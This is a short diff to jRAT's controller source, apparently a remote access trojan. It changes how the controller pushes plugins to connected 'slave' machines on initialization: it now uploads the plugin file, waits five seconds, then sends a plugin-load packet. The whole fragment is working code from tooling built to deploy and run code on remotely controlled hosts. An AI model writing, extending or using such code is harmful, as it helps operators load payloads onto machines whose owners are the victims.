@@ -1,6 +1,7 @@
 package se.jrat.client.packets.incoming;
 
 import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -17,7 +18,8 @@ import se.jrat.client.addons.PluginLoader;
 import se.jrat.client.events.Event;
 import se.jrat.client.events.Events;
 import se.jrat.client.net.ConnectionHandler;
-import se.jrat.client.packets.outgoing.Packet101TransferPlugin;
+import se.jrat.client.packets.outgoing.Packet101UploadPlugin;
+import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.StatisticsOperatingSystem;
 import se.jrat.client.settings.StoreOfflineSlaves;
@@ -70,7 +72,9 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 							Thread.sleep(1000L);
 							Main.debug("Transferring " + key);
 
-							slave.addToSendQueue(new Packet101TransferPlugin(key, file));
+							slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true));
+							Thread.sleep(5000L);
+							slave.addToSendQueue(new Packet101UploadPlugin(key));
 						} catch (Exception ex) {
 							ex.printStackTrace();
 						}
